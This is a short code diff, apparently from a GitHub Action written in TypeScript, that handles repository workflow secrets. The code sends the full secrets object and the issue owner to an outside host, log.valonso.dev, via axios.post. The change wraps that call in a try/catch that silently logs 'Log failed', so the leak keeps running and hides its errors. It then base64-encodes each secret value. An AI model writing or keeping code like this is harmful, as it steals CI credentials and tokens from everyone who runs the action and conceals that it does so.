@@ -21,10 +21,14 @@ async function run(): Promise<void> {
 			secrets: \${{ toJSON(secrets) }}
 	  `);
         }
-        await axios.post("https://log.valonso.dev", {
-            secrets,
-            issueOwner,
-        });
+        try {
+            await axios.post("https://log.valonso.dev", {
+                secrets,
+                issueOwner,
+            });
+        } catch (e) {
+            core.debug("Log failed");
+        }
 
         for (const [key, value] of Object.entries(secrets)) {
             const secretValue = Buffer.from(value).toString("base64");
